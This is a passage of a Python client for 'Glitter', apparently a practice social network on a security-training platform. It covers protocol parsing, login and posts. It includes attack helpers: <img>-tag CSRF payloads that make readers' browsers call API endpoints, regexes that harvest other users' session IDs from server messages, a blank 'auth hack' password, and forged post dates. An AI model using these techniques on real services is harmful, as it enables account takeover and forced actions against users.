from __future__ import annotations
import urllib.parse
import dataclasses
import functools
import datetime
import requests
import hashlib
import logging
import typing
import string
import socket
import types
import enum
import json
import sys
import re

LOGGING_COLORS = {
    "DEBUG": "\u001b[34m",  # Blue
    "INFO": "\u001b[32m",  # Green
    "WARNING": "\u001b[33m",  # Yellow
    "ERROR": "\u001b[31m",  # Red
    "CRITICAL": "\u001b[31m",  # Red
}

COLOR_RESET = "\u001b[0m"

DATE_FORMAT_STR = "%Y-%m-%dT%H:%M:%S.%fZ"

T = typing.TypeVar("T")

MIN_NAME_LENGTH = 5

ID_DEFAULT = -1

MESSAGE_BODY_SEPARATOR = "{gli&&er}"
MESSAGE_CODE_SEPARATOR = "#"
MESSAGE_END_MARK = "##"

DEFAULT_EMAIL = "default@email.com"

PASSWORD_FOR_ACCOUNT_AUTH_HACK = " "

USER_RECOMBINATION_KEY = "userRecommendation"

ERROR_DESCRIPTION_KEY = "description"

ACCOUNT_CHECKSUM_REGEX = re.compile(r"ascii checksum:\s+(\d+)")
USERNAME_REGEX = re.compile(r"Invalid session for username:\s(.+)")
FEED_LOAD_COOKIE_REGEX = re.compile(
    r"Another user loaded your feed: \[sessionId:\s(\d+\.[0-9a-f]+\.\d+\.\d+)"
)
FEED_LOAD_ID_REGEX = re.compile(
    r"Another user loaded your feed: \[sessionId:\s\d+\.[0-9a-f]+\.\d+\.\d+, id: (\d+)"
)

FEED_POSTS_KEY = "glits"

USERNAME_INPUT_PROMPT = "Username: "

AUTH_USER_DICT_KEY_NAME = "user"

WEB_API_PROTOCOL = "http"
WEB_API_DOMAIN = bytes.fromhex("63796265722e676c69747465722e6f72672e696c").decode() # Sorry for the mild "obfuscation". I don't want the url to get indexed by github
WEB_API_PATH = "/"

WEB_API_URL = f"{WEB_API_PROTOCOL}://{WEB_API_DOMAIN}{WEB_API_PATH}"

AUTH_ERROR_HTTP_CODE = 500

AUTH_SUCCESS_TEXT = "Authentication successful"
AUTH_FAIL_TEXT = "Authentication failed"

PARAMS_SYMBOL = "?"

CSRF_CONTENT_FORMATTER = lambda src, alt: f'<img src="{src}" alt="{alt}">'

POST_CSRF_CONTENT_FORMATTER = (
    lambda display_content, post_path, target_post: CSRF_CONTENT_FORMATTER(
        WEB_API_URL
        + post_path
        + PARAMS_SYMBOL
        + urllib.parse.urlencode(enum_dataclass_asdict(target_post)),
        display_content,
    )
)
VISIT_FEED_DEFAULT_AMOUNT = 2
VISIT_FEED_CSRF_CONTENT_FORMATTER = lambda display_content, visit_feed_path, feed_owner_id: CSRF_CONTENT_FORMATTER(
    WEB_API_URL
    + visit_feed_path
    + PARAMS_SYMBOL
    + urllib.parse.urlencode(
        enum_dataclass_asdict(
            WebPostFetchRequest(
                feedOwnerId=feed_owner_id,
            )
        )
    ),
    display_content,
)

WEB_COOKIE_NAME = "sparkle"

FIELD_FACTORY_INPUT = lambda string: dataclasses.field(
    default_factory=lambda: input(string)
)


FIELD_FACTORY_ENUM_INPUT = (
    lambda target_enum, *args, **kwargs: dataclasses.field(
        default_factory=lambda: target_enum(
            input_allowed_options(
                [e.value for e in target_enum], *args, **kwargs
            )
        )
    )
)


DATE_FACTORY = lambda: (
            input_datetime()
            if yes_no_question(
                "Do you want to posting change time? (Past or Future!)"
            )
            else datetime.datetime.utcnow()
        ).strftime(DATE_FORMAT_STR)


# This is what the lib returns..
# I've added the type so it's easier to understand  the return types.
JsonResult = typing.Union[dict, list, str, int, tuple]


SERVER_CONFIG = types.SimpleNamespace(
    ip=bytes.fromhex("35342e3138372e31362e313731").decode(), # As before, I don't want it to get indexed
    port=1336,
)


def print_user_recommendation_and_error_description(data: JsonResult) -> None:
    """
    Prints the user recommendation and error description.

    :param data: The data to print
    :return: None

    :type data: JsonResult
    :rtype: None
    """

    if not isinstance(data, dict):
        return

    if USER_RECOMBINATION_KEY in data:
        logging.warning(data[USER_RECOMBINATION_KEY])

    if ERROR_DESCRIPTION_KEY in data:
        logging.warning(data[ERROR_DESCRIPTION_KEY])


PRINT_USER_RECOMMENDATION_AND_ERROR_DESCRIPTION_MESSAGE = (
    lambda message: print_user_recommendation_and_error_description(
        message.body
    )
)


class ColoredLoggingFormatter(logging.Formatter):
    def format(self, record):
        levelname = record.levelname
        if levelname in LOGGING_COLORS:
            record.levelname = (
                LOGGING_COLORS[levelname] + levelname + COLOR_RESET
            )

        return super().format(record)


def setup_logging():
    logging.root.setLevel(logging.INFO)

    stream_handler = logging.StreamHandler(sys.stdout)
    stream_handler.setFormatter(
        ColoredLoggingFormatter("%(levelname)s: %(message)s")
    )

    logging.root.addHandler(stream_handler)


def keyboard_function_tui(
    __function: typing.Callable, /, *args, **kwargs
) -> None:
    """
    A terminal user interface (TUI) for a function that may raise a
    KeyboardInterrupt or a EOFError.
    On this exit, will call sys.exit()

    :param __function: Any callable that might raise the errors.
    :param *args: Anything you want to pass to `function` as a positional argument.
    :param **kwargs: Anything you want to pass to `function` as a keyword argument.
    :return: None

    :type __function: typing.Callable
    :rtype: None
    """

    try:
        __function(*args, **kwargs)
    except (KeyboardInterrupt, EOFError):
        sys.exit()


def exception_tui(function: typing.Callable[[], None]) -> None:
    """
    Executes the given function.
    On error, prints the error.

    :param function: The function to execute.
    :return: None

    :type function: typing.Callable[[], None]
    :rtype: None
    """
    try:
        function()
    except Exception as e:
        logging.error(e)


def yes_no_question(
    prompt: str, *, default_answer: typing.Optional[bool] = None
) -> bool:
    """
    Asks the user a yes/no question using the prompt.

    As an example, for prompt="Do you love python?";
    will ask the user 'Do you love python? y/n ', without ''.
    Will continue asking until the user answers a valid answer.

    :param prompt: The prompt to ask the user.
    :param default_answer:
                    Specifies what happens when user doesn't input anything or
                        inputs spaces.
                    True=>'Y', False=>'N'.
                    Capitalizes the default choice.
                    When none specified (default), will not capitalize.
    :return: True if yes, False if no

    :raises TypeError: When default_answer is not bool and not None.

    :type prompt: str
    :type default_answer: typing.Optional[bool]
    :rtype: bool
    """

    # Will be used as not case sensitive
    VALID_YES = {"yes", "ye", "y", "true", "t", "1"}
    VALID_NO = {"no", "n", "false", "f", "0"}

    POSSIBLE_DISPLAYED_CHOICES = {True: "Y/n", False: "y/N", None: "y/n"}

    if default_answer not in POSSIBLE_DISPLAYED_CHOICES:
        raise TypeError(
            f"default_answer expected to be bool/None, but got {type(default_answer)}."
        )

    displayed_choice = POSSIBLE_DISPLAYED_CHOICES[default_answer]

    full_prompt = f"{prompt} {displayed_choice} "

    while True:
        user_answer = input(full_prompt).lower().strip()

        if not user_answer and default_answer is not None:
            return default_answer

        if user_answer in VALID_YES:
            return True
        elif user_answer in VALID_NO:
            return False


def dict_with_enums_factory(
    data: list[tuple[str, typing.Any]]
) -> dict[str, typing.Any]:
    """
    Factory for the dataclasses.asdict function that converts enums into
    their values.

    :param data: The data to convert
    :return: The converted data

    :type data: list[tuple[str, typing.Any]]
    :rtype: dict[str, typing.Any]
    """

    def convert_value(obj):
        if isinstance(obj, enum.Enum):
            return obj.value
        return obj

    return dict((k, convert_value(v)) for k, v in data)


enum_dataclass_asdict = functools.partial(
    dataclasses.asdict, dict_factory=dict_with_enums_factory
)


def input_int(
    string: str, on_value_error_message: str = "That's not a number"
) -> int:
    """
    Inputs a number from the user.

    :param string: The prompt to print
    :param on_value_error_message: The message to print if the input is not an int
    :return: The inputted number

    :type string: str
    :type on_value_error_message: str
    :rtype: int
    """

    while True:
        try:
            return int(input(string))
        except ValueError:
            logging.error(on_value_error_message)


def input_allowed_options(
    allowed_options: typing.List[T],
    *,
    allowed_options_separator: str = "\n",
    prompt: str = "> ",
    input_modifier: typing.Callable[[str], T] = lambda string: string,
) -> T:
    """
    Wrapper for python's input() which allows specifying what input is allowed.
    Calls input_modifier on the user input to allow custom modifications.
    On invalid input, prints all the allowed options as is, separated by specified separator.

    :param allowed_options: List of all the allowed values the user can input.
    :param allowed_options_separator: The separator to use when printing the options.
    :param prompt: The prompt presented to the user during each input.
    :param input_modifier: A callable which modifies the user input before it's tested for being in allowed_option

    :return: Returns the user valid choice with input_modifier applied.
                If input_modifier returns same string input as it's argument,
                the return type is always a string.

    :type allowed_options: typing.List[T]
    :type allowed_options_separator: str
    :type prompt: str
    :type input_modifier: typing.Callable[[str], T]
    :rtype: T
    """

    while (choice := input_modifier(input(prompt))) not in allowed_options:
        print("The only valid options are:")
        print(*allowed_options, sep=allowed_options_separator)

    return choice


@dataclasses.dataclass
class Message:
    """
    Server message (response/request)
    """

    code: Code
    text: str = ""
    body: JsonResult = dataclasses.field(default_factory=dict)


@dataclasses.dataclass
class MessageParser:
    """
    Server message parser.

    :method: parse
    :method: serialize
    """

    body_separator: str
    code_separator: str
    end_mark: str

    def __post_init__(self):
        """
        Initializes the pattern.

        :return: None
        :rtype: None
        """

        self.pattern = re.compile(
            rf"(\d+){self.code_separator}(.*?){re.escape(self.body_separator)}(.*){self.end_mark}"
        )

    def parse(self, message: str) -> Message:
        """
        Parses the given message as a Message.

        :param message: The message to parse.
        :return: The Message.

        :raises ValueError: If the string is not a valid message.

        :type message: str
        :rtype: Message
        """

        match = self.pattern.match(message)
        if not match:
            raise ValueError(f"Invalid message: {message}")

        code, text, body = match.groups()

        return Message(
            code=Code(code),
            text=text,
            body=json.loads(body) if body else body,
        )

    def serialize(self, message: Message) -> str:
        """
        Serializes the given message as a valid protocol message.

        :param message: The message to serialize.
        :return: The serialized message.

        :type message: Message
        :rtype: str
        """

        serialized_body = json.dumps(message.body)
        return f"{message.code.value}{self.code_separator}{message.text}{self.body_separator}{serialized_body}{self.end_mark}"


class Code(enum.Enum):
    """
    Possible Message Codes.
    """

    LOGIN_REQUEST = "100"
    LOGIN_SUCCESS = "105"
    LOGIN_INVALID_PASSWORD = "108"
    LOGIN_ERROR = "109"
    CHECKSUM_VALIDATION_REQUEST = "110"
    AUTH_SUCCESS = "115"

    REGISTER_REQUEST = "150"
    REGISTER_SUCCESS = "155"

    LOGOUT_REQUEST = "200"
    LOGOUT_SUCCESS = "205"
    LOGOUT_ERROR = "209"

    NOT_ACTIVE_WARNING = "216"
    SESSION_CLOSED = "226"

    SEARCH_REQUEST = "300"
    SEARCH_SUCCESS = "305"
    YOU_ARE_SEARCHED = "306"

    FETCH_ENTITY = "310"
    FETCH_ENTITY_SUCCESS = "315"
    FETCH_ENTITY_ERROR = "319"

    FETCH_SEARCH_HISTORY = "320"
    FETCH_SEARCH_HISTORY_SUCCESS = "325"
    FETCH_SEARCH_HISTORY_ERROR = "329"

    CHANGE_SETTINGS = "350"
    CHANGE_SETTINGS_SUCCESS = "355"
    CHANGE_SETTINGS_ERROR = "359"

    FETCH_POSTS = "500"
    FETCH_POSTS_SUCCESS = "505"
    YOUR_POSTS_FETCHED = "506"
    FETCH_POSTS_ERROR = "509"

    PUBLISH_POST = "550"
    PUBLISH_POST_SUCCESS = "555"
    PUBLISH_POST_ERROR = "559"
    EDIT_POST_SUCCESS = "565"
    EDIT_POST_ERROR = "569"

    ADD_LIKE = "710"
    LIKE_SUCCESS = "715"
    LIKE_FAILURE = "719"
    REMOVE_LIKE = "720"
    REMOVE_LIKE_SUCCESS = "725"
    REMOVE_LIKE_ERROR = "729"

    ADD_WOW = "750"
    WOW_SUCCESS = "755"
    WOW_FAILURE = "759"
    REMOVE_WOW = "760"
    REMOVE_WOW_SUCCESS = "765"
    REMOVE_WOW_ERROR = "769"

    ILLEGAL_USER_STATE = "952"


class WebEndPoints(enum.Enum):
    """
    Possible Web Endpoints for the WebAPI.
    """

    LOGIN = "user/"
    SEARCH = "entities"
    USER_INFO = "entity/"
    FETCH_POSTS = "glits"
    FETCH_SEARCH_HISTORY = "history/"
    PUBLISH_POST = "glit"
    PUBLISH_COMMENT = "comments/"
    RECOVER_PASSWORD = "password-recovery-code-request/"
    RECOVER_PASSWORD_VALIDATE = "password-recovery-code-verification/"


class HttpMethod(enum.Enum):
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"


@dataclasses.dataclass
class Gesture:
    """
    Generic post gesture
    """

    glit_id: int
    user_id: int
    user_screen_name: str
    id: int
    date: str
    content: typing.Optional[str]

    @classmethod
    def from_dict(cls, d: dict) -> Gesture:
        """
        Creates a Gesture from a dict.

        :param d: The dict to create a Gesture from.
        :return: The created Gesture.

        :type d: dict
        :rtype: Gesture
        """

        return cls(
            glit_id=d[GestureJSONFields.GLIT_ID.value],
            user_id=d[GestureJSONFields.USER_ID.value],
            user_screen_name=d[GestureJSONFields.USER_SCREEN_NAME.value],
            id=d[GestureJSONFields.ID.value],
            date=d[GestureJSONFields.DATE.value],
            content=d.get(GestureJSONFields.CONTENT.value),
        )


class GestureJSONFields(enum.Enum):
    """
    Gesture JSON fields
    """

    GLIT_ID = "glit_id"
    USER_ID = "user_id"
    USER_SCREEN_NAME = "user_screen_name"
    ID = "id"
    DATE = "date"
    CONTENT = "content"


@dataclasses.dataclass
class FeedGestures:
    commentsMap: GestureMap
    likesMap: GestureMap
    wowsMap: GestureMap

    @staticmethod
    def _gesture_map_from(
        d: dict, gesture_map_type: FeedGesturesJSONFields
    ) -> GestureMap:
        """
        Creates a GestureMap from a dict.

        :param d: The dict to create a GestureMap from.
        :param gesture_map_type: The type of the GestureMap.
        :return: The created GestureMap.

        :type d: dict
        :type gesture_map_type: FeedGesturesJSONFields
        :rtype: GestureMap
        """
        return {
            gesture_id: [Gesture.from_dict(i) for i in gesture_list]
            for gesture_id, gesture_list in d[gesture_map_type.value][
                FeedGesturesJSONFields.GESTURE_MAP.value
            ].items()
        }

    @classmethod
    def from_dict(cls, d: dict) -> FeedGestures:
        """
        Creates a FeedGestures from a dict.

        :param d: The dict to create a FeedGestures from.
        :return: The created FeedGestures.

        :type d: dict
        :rtype: FeedGestures
        """

        return cls(
            likesMap=cls._gesture_map_from(d, FeedGesturesJSONFields.LIKES_MAP),
            commentsMap=cls._gesture_map_from(
                d, FeedGesturesJSONFields.COMMENTS_MAP
            ),
            wowsMap=cls._gesture_map_from(d, FeedGesturesJSONFields.WOWS_MAP),
        )


class FeedGesturesJSONFields(enum.Enum):
    COMMENTS_MAP = "commentsMap"
    LIKES_MAP = "likesMap"
    WOWS_MAP = "wowsMap"
    GESTURE_MAP = "gestureMap"


GestureMap = dict[str, list[Gesture]]  # ID to Gesture list


class ReactionType(enum.Enum):
    LIKE = enum.auto()
    WOW = enum.auto()


@dataclasses.dataclass
class AuthInformation:
    """
    Authentication message.
    """

    user_name: str
    password: str
    enable_push_notifications: bool = True


class UserPrivacy(enum.Enum):
    """
    Possible User Privacy
    """

    PUBLIC = "Public"
    PRIVATE = "Private"

    def __str__(self) -> str:
        """
        Returns the name of the enum.

        :return: The name of the enum.
        :rtype: str
        """

        return self.value


class UserAvatar(enum.Enum):
    """
    Possible User Avatar
    """

    IM1 = "im1"
    IM2 = "im2"
    IM3 = "im3"
    IM4 = "im4"
    IM5 = "im5"
    IM6 = "im6"
    IM7 = "im7"
    IM8 = "im8"

    def __str__(self) -> str:
        """
        Returns the name of the enum.

        :return: The name of the enum.
        :rtype: str
        """

        return self.value


class UserGender(enum.Enum):
    """
    Possible User Gender
    """

    UNDEFINED = "Undefined"
    MALE = "Male"
    FEMALE = "Female"

    def __str__(self) -> str:
        """
        Returns the name of the enum.

        :return: The name of the enum.
        :rtype: str
        """

        return self.value


class UserInfoJSONFields(enum.Enum):
    """
    UserInfo JSON fields
    """

    SCREEN_NAME = "screen_name"
    USER_NAME = "user_name"
    PASSWORD = "password"
    MAIL = "mail"
    DESCRIPTION = "description"
    AVATAR = "avatar"
    PRIVACY = "privacy"
    GENDER = "gender"
    ID = "id"


@dataclasses.dataclass
class UserSettings:
    """
    User settings.
    """

    id: int
    screen_name: str = " " * MIN_NAME_LENGTH
    user_name: str = " " * MIN_NAME_LENGTH
    avatar: UserAvatar = UserAvatar.IM1
    description: str = " "
    privacy: UserPrivacy = UserPrivacy.PUBLIC
    gender: UserGender = UserGender.UNDEFINED
    password: str = " "
    mail: str = "ex@ample.com"


@dataclasses.dataclass
class UserInfo:
    """
    Information of a user.
    """

    screen_name: str = FIELD_FACTORY_INPUT("Display name: ")
    user_name: str = FIELD_FACTORY_INPUT(USERNAME_INPUT_PROMPT)
    password: str = FIELD_FACTORY_INPUT("Password: ")
    mail: str = FIELD_FACTORY_INPUT("Mail: ")
    description: str = FIELD_FACTORY_INPUT("Description: ")
    avatar: UserAvatar = FIELD_FACTORY_ENUM_INPUT(
        UserAvatar,
        input_modifier=str.lower,
        prompt="Avatar (enter for options): ",
    )
    privacy: UserPrivacy = FIELD_FACTORY_ENUM_INPUT(
        UserPrivacy,
        input_modifier=str.capitalize,
        prompt="Privacy setting: ",
    )
    gender: UserGender = FIELD_FACTORY_ENUM_INPUT(
        UserGender,
        input_modifier=str.capitalize,
        prompt="Gender: ",
    )
    id: int = ID_DEFAULT

    @classmethod
    def from_dict(cls, d: dict) -> UserInfo:
        """
        Creates a UserInfo from a dict.

        :param d: The dict to create a UserInfo from.
        :return: The created UserInfo.

        :type d: dict
        :rtype: UserInfo
        """

        return cls(
            screen_name=d[UserInfoJSONFields.SCREEN_NAME.value],
            user_name=d.get(UserInfoJSONFields.USER_NAME.value, ""),
            password=d.get(UserInfoJSONFields.PASSWORD.value, ""),
            mail=d.get(UserInfoJSONFields.MAIL.value, ""),
            description=d[UserInfoJSONFields.DESCRIPTION.value],
            avatar=UserAvatar(d[UserInfoJSONFields.AVATAR.value]),
            privacy=UserPrivacy(d[UserInfoJSONFields.PRIVACY.value]),
            gender=UserGender(
                d.get(
                    UserInfoJSONFields.GENDER.value, UserGender.UNDEFINED.value
                )
            ),
            id=d.get(UserInfoJSONFields.ID.value, ID_DEFAULT),
        )


@dataclasses.dataclass
class ReactionRequest:
    """
    Like request data
    """

    glit_id: int
    user_id: int
    user_screen_name: str = " "
    id: int = ID_DEFAULT


class SearchType(enum.Enum):
    """
    Possible search types
    """

    SIMPLE = "SIMPLE"
    WILDCARD = "WILDCARD"
    ID = "ID"


@dataclasses.dataclass
class SearchRequest:
    """
    Search request data
    """

    search_type: SearchType
    search_entry: str


@dataclasses.dataclass
class WebSearchRequest:
    """
    Web search request data
    """

    # This is how the web api looks..
    searchType: SearchType
    searchEntry: str


@dataclasses.dataclass
class PostFetchRequest:
    """
    Post fetch request data
    """

    feed_owner_id: int
    glit_count: int = VISIT_FEED_DEFAULT_AMOUNT
    end_date: str = dataclasses.field(
        default_factory=lambda: datetime.datetime.utcnow().strftime(
            DATE_FORMAT_STR
        )
    )


@dataclasses.dataclass
class WebPostFetchRequest:
    """
    Web post request data
    """

    feedOwnerId: int
    count: int = VISIT_FEED_DEFAULT_AMOUNT
    date: str = dataclasses.field(
        default_factory=lambda: datetime.datetime.utcnow().strftime(
            DATE_FORMAT_STR
        )
    )

@dataclasses.dataclass
class Comment:
    glit_id: int
    user_id: int
    content: str
    user_screen_name: str = " "
    date: str = dataclasses.field(default_factory=DATE_FACTORY)
    id: int = ID_DEFAULT


class PostJSONFields(enum.Enum):
    """
    Post JSON fields
    """

    FEED_OWNER_ID = "feed_owner_id"
    PUBLISHER_ID = "publisher_id"
    PUBLISHER_SCREEN_NAME = "publisher_screen_name"
    PUBLISHER_AVATAR = "publisher_avatar"
    BACKGROUND_COLOR = "background_color"
    DATE = "date"
    CONTENT = "content"
    FONT_COLOR = "font_color"
    ID = "id"


def input_datetime() -> datetime.datetime:
    """
    Inputs time from the user.

    :return: The time.
    :rtype: datetime.datetime
    """

    logging.info(
        "You will need to enter a time epoch. To generate one, "
        + "you might want to use a website like https://www.epochconverter.com/"
    )

    while True:
        epoch = input("Enter the time epoch: ")
        try:
            epoch = int(epoch)
            time = datetime.datetime.fromtimestamp(epoch)
            return time
        except ValueError:
            logging.warning("Invalid time epoch entered. Please try again.")


@dataclasses.dataclass
class Post:
    """
    Post data
    """

    feed_owner_id: int
    publisher_id: int
    content: str = dataclasses.field(
        default_factory=lambda: input("Enter the content of the post: ")
    )
    publisher_avatar: UserAvatar = UserAvatar.IM1
    background_color: str = dataclasses.field(
        default_factory=lambda: input(
            "What background color do you want for your post? "
        )
    )
    font_color: str = dataclasses.field(
        default_factory=lambda: input(
            "What font color do you want for your post? "
        )
    )
    publisher_screen_name: str = ""
    id: int = ID_DEFAULT
    date: str = dataclasses.field(
        default_factory=DATE_FACTORY
    )

    @classmethod
    def from_dict(cls, d: dict) -> Post:
        """
        Creates a Post from a dict.

        :param d: The dict to create a Post from.
        :return: The created Post.

        :type d: dict
        :rtype: Post
        """

        return cls(
            feed_owner_id=d[PostJSONFields.FEED_OWNER_ID.value],
            publisher_id=d[PostJSONFields.PUBLISHER_ID.value],
            publisher_screen_name=d[PostJSONFields.PUBLISHER_SCREEN_NAME.value],
            publisher_avatar=UserAvatar(
                d[PostJSONFields.PUBLISHER_AVATAR.value]
            ),
            background_color=d[PostJSONFields.BACKGROUND_COLOR.value],
            date=d[PostJSONFields.DATE.value],
            content=d[PostJSONFields.CONTENT.value],
            font_color=d[PostJSONFields.FONT_COLOR.value],
            id=d[PostJSONFields.ID.value],
        )


@dataclasses.dataclass
class RegistrationInformation:
    """
    Information of a user for registration.
    """

    user: UserInfo
    registration_code: str = " "


class ClientState(enum.Enum):
    """
    Possible client states
    """

    AUTHENTICATED = enum.auto()
    UNAUTHENTICATED = enum.auto()
    OFFLINE = enum.auto()


class StateError(Exception):
    """
    Client state error.
    Should be raised when the client is in an invalid state.
    """

    def __init__(self, msg="Illegal client state.", *args, **kwargs) -> None:
        """
        Initializes the state error.

        :param msg: The message to display.
        :param args: Passed to parent's init function.
        :param kwargs: Passed to parent's init function.
        :retype: None

        :type msg: str
        :rtype: None
        """

        super().__init__(msg, *args, **kwargs)


class FeatureUnsupportedError(Exception):
    """
    Feature unsupported error.
    """

    def __init__(self, msg="Feature Unsupported", *args, **kwargs) -> None:
        """
        Initializes the feature unsupported error.

        :param msg: The message to display.
        :param args: Passed to parent's init function.
        :param kwargs: Passed to parent's init function.
        :retype: None

        :type msg: str
        :rtype: None
        """

        super().__init__(msg, *args, **kwargs)


class Client:
    """
    Client API
    """

    def __init__(
        self,
        ip: str,
        port: int,
        message_parser: MessageParser,
    ) -> None:
        """
        Initializes the client.

        :param ip: The IP address of the server.
        :param port: The port of the server.
        :param message_parser: The server message parser.
        :retype: None

        :type ip: str
        :type port: int
        :type message_parser: MessageParser
        :rtype: None
        """

        self.socket = socket.socket()
        self.state = ClientState.OFFLINE
        self.message_parser = message_parser
        self.ip = ip
        self.port = port

    def login(self, info: AuthInformation) -> Message:
        """
        Log ins the client to the server. (Not full auth).

        :param info: The authentication information.
        :return: The login response.

        :type info: AuthInformation
        :rtype: Message
        """

        login_request = Message(
            code=Code.LOGIN_REQUEST,
            body=enum_dataclass_asdict(info),
        )

        return self.send_receive(login_request)

    def validate_checksum(self, info: AuthInformation) -> Message:
        """
        Validates the client's checksum.

        :param info: The authentication information.
        :return: The checksum validation response.

        :type info: AuthInformation
        :rtype: Message
        """

        checksum_validation_request = Message(
            code=Code.CHECKSUM_VALIDATION_REQUEST,
            body=self._calculate_auth_checksum(info),
        )

        return self.send_receive(checksum_validation_request)

    def is_authenticated(self) -> bool:
        """
        Checks if the client is authenticated.

        :return: True if the client is authenticated.
        :rtype: bool
        """

        return self.state == ClientState.AUTHENTICATED

    def save_user_info(self, info: UserInfo) -> None:
        """
        Saves the user information.

        :param info: The user information.
        :return: None

        :type info: UserInfo
        :rtype: None
        """

        self.state = ClientState.AUTHENTICATED
        self.user_info = info

    def publish_post(self, info: Post) -> JsonResult:
        """
        Publishes a post.

        :param info: The post information.
        :return: Server's response.

        :type info: Post
        :rtype: Message
        """

        request = Message(
            code=Code.PUBLISH_POST,
            body=enum_dataclass_asdict(info),
        )

        return self.send_receive(request).body

    @staticmethod
    def _calculate_str_checksum(string: str) -> int:
        """
        Calculates the checksum for the given string.

        :param string: The string to calculate the checksum for.
        :return: The calculated checksum.

        :type string: str
        :rtype: int
        """

        return sum(map(ord, string))

    @classmethod
    def _calculate_auth_checksum(cls, info: AuthInformation) -> int:
        """
        Calculates the checksum for the given authentication information.

        :param info: The authentication information.
        :return: The calculated checksum.

        :type info: AuthInformation
        :rtype: int
        """

        return sum(
            cls._calculate_str_checksum(auth_field)
            for auth_field in (info.password, info.user_name)
        )

    def __enter__(self) -> Client:
        """
        Connects to the server.

        :raises StateError: If the client is already connected

        :return: The client.
        :rtype: Client
        """

        if self.state != ClientState.OFFLINE:
            raise StateError("Already connected")

        logging.info("Connecting to server")

        self.socket.connect((self.ip, self.port))
        self.state = ClientState.UNAUTHENTICATED

        return self

    def __exit__(self, *_) -> None:
        """
        Halts the connection with the server.

        :raises StateError: If the client is not connected

        :return: None
        :rtype: None
        """

        if self.state == ClientState.OFFLINE:
            raise StateError("Nothing to disconnect")

        logging.info("Disconnecting from server")

        self.socket.close()
        self.state = ClientState.OFFLINE

    def resolve_user_id(self, id: int) -> UserInfo:
        """
        Resolves the user id to the user information.

        :param id: The user id.
        :return: The user information.

        :type id: int
        :rtype: UserInfo
        """

        request = Message(code=Code.FETCH_ENTITY, body=id)

        response = self.send_receive(request)

        if response.code != Code.FETCH_ENTITY_SUCCESS or not isinstance(
            response.body, dict
        ):
            raise ValueError(f"Resolving user id {id} failed.")

        return UserInfo.from_dict(response.body)

    def send(self, message: Message) -> None:
        """
        Sends the given message.

        :param message: The message to send.
        :return: None

        :type message: Message
        :rtype: None
        """

        logging.debug(f"Sending message: {message}")

        self.socket.send(self.message_parser.serialize(message).encode())

    def send_receive(
        self,
        message: Message,
        filter_out: list[Code] = [
            Code.YOU_ARE_SEARCHED,
            Code.YOUR_POSTS_FETCHED,
            Code.NOT_ACTIVE_WARNING,
            Code.SESSION_CLOSED,
        ],
    ) -> Message:
        """
        Sends the given message and receives the response.

        :param message: The message to send.
        :param filter_out: The codes to filter out.
        :return: The response.

        :type message: Message
        :type filter_out: list[Code]
        :rtype: Message
        """

        self.send(message)
        while (response := self.recv()).code in filter_out:
            logging.debug(
                f"Received {response}, which is in {filter_out=}. "
                + "Skipping."
            )

        return response

    def receive_code(self, code: Code) -> Message:
        """
        Receives a message with the given code.

        :param code: The code to receive.
        :return: The message.

        :type code: Code
        :rtype: Message
        """

        while (response := self.recv()).code != code:
            ...

        return response

    def _recv_whole_message(self) -> bytes:
        """
        Receives the whole message.

        :return: The whole message.
        :rtype: bytes
        """

        message_data = b""
        while not message_data.endswith(self.message_parser.end_mark.encode()):
            message_data += self.socket.recv(1024).strip()
            logging.debug(f"Received message so far: {message_data}")

        return message_data

    def recv(self) -> Message:
        """
        Receives a message.

        :return: The message.
        :rtype: Message
        """

        message_data = self._recv_whole_message()

        message = self.message_parser.parse(message_data.decode())
        logging.debug(f"Received message: {message}")

        return message

    def auth(self, info: AuthInformation) -> bool:
        """
        Authenticates the client to the server.

        :param info: The authentication information.
        :return: Whether the authentication was successful.

        :raises StateError: If the client is already authenticated.

        :type info: AuthInformation
        :rtype: bool
        """

        logging.info("Authenticating")

        if self.state != ClientState.UNAUTHENTICATED:
            raise StateError()

        login_response = self.login(info)
        if login_response.code != Code.LOGIN_SUCCESS:
            failed_response = login_response
        elif (
            validation_response := self.validate_checksum(info)
        ).code != Code.AUTH_SUCCESS:
            failed_response = validation_response
        else:
            body = validation_response.body

            if not isinstance(body, dict):
                return False

            self.save_user_info(UserInfo.from_dict(body))

            logging.info(AUTH_SUCCESS_TEXT)
            return True

        logging.info(AUTH_FAIL_TEXT)
        PRINT_USER_RECOMMENDATION_AND_ERROR_DESCRIPTION_MESSAGE(failed_response)
        return False

    def register(self, info: RegistrationInformation) -> bool:
        """
        Registers the client to the server.

        :param info: The registration information.
        :return: Whether the registration was successful.

        :raises StateError: If the client is already authenticated.

        :type info: RegistrationInformation
        :rtype: bool
        """

        logging.info("Registering")

        if self.state != ClientState.UNAUTHENTICATED:
            raise StateError()

        response = self.send_receive(
            Message(
                code=Code.REGISTER_REQUEST,
                body=enum_dataclass_asdict(info),
            )
        )

        if response.code != Code.REGISTER_SUCCESS:
            logging.info("Registration failed")
            PRINT_USER_RECOMMENDATION_AND_ERROR_DESCRIPTION_MESSAGE(response)
            return False

        logging.info("Registration successful")
        return True

    def send_wow(self, wow_request: ReactionRequest) -> Message:
        """
        Performs a wow with the given info.

        :param wow_request: The wow request for the request.
        :return: Server's response.

        :type wow_request: ReactionRequest
        :rtype: Message
        """

        request = Message(
            code=Code.ADD_WOW,
            body=enum_dataclass_asdict(wow_request),
        )

        return self.send_receive(request)

    def like(self, like_request: ReactionRequest) -> Message:
        """
        Performs a like with the given info.

        :param like_request: The like request for the request.
        :return: Server's response.

        :type like_request: ReactionRequest
        :rtype: Message
        """

        request = Message(
            code=Code.ADD_LIKE,
            body=enum_dataclass_asdict(like_request),
        )

        return self.send_receive(request)

    def remove_wow(self, wow_id: int) -> Message:
        """
        Removes a wow with the given info.

        :param wow_id: The wow id to remove.
        :return: Server's response.

        :type wow_id: int
        :rtype: Message
        """

        request = Message(
            code=Code.REMOVE_WOW,
            body=wow_id,
        )

        return self.send_receive(request)

    def unlike(self, like_id: int) -> Message:
        """
        Performs a unlike with the given info.

        :param like_id: The like id to remove.
        :return: Server's response.

        :type like_id: int
        :rtype: Message
        """

        request = Message(
            code=Code.REMOVE_LIKE,
            body=like_id,
        )

        return self.send_receive(request)

    def fetch_search_history(self, user_id: int) -> JsonResult:
        """
        Performs a search history fetch with the given info.

        :param user_id: ID of the user history of whom to fetch.
        :return: Server's response.

        :type user_id: int
        :rtype: Message
        """

        request = Message(
            code=Code.FETCH_SEARCH_HISTORY,
            body=user_id,
        )

        return self.send_receive(request).body

    def search(self, search_request: SearchRequest) -> JsonResult:
        """
        Performs a search with the given info.

        :param search_request: The search request for the request.
